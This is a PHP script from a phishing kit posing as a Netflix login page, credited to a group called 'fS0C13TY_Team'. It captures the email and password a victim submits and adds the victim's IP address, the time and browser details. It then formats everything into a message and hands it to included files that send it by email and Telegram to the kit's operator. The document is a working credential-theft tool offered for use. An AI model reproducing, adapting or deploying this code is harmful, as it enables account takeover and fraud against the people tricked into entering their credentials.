<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * NETFLIX -
 * version 01
 * icq & telegram = @FUCKTOS0C13TY
 
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 NETFLIX           $#
###############################################

**/

session_start();

include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$iduserLoginId = $_SESSION['iduserLoginId'] = $_POST['iduserLoginId'];

$idpassword = $_SESSION['idpassword'] = $_POST['idpassword'];


$hero .= '
✉️ N E T F L I X - L O G I N  ✉️ 
📧 EMAIL = '.$_SESSION['iduserLoginId'].'
🔑 PASSWORD = '.$_SESSION['idpassword'].'
👀 IP LOOKUP INFORMATION 👀
👀 IP ADDRESS = '.$_SERVER['REMOTE_ADDR'].'
⏰ TIME/DATE = '.$InfoDATE.'
☠️ BROWSER = '.$OS.'
      🦸‍♂️  HERO  🦸‍♂️
';





include("sand_email.php"); 
include("Add_Your_TelegramAPi.php");





?>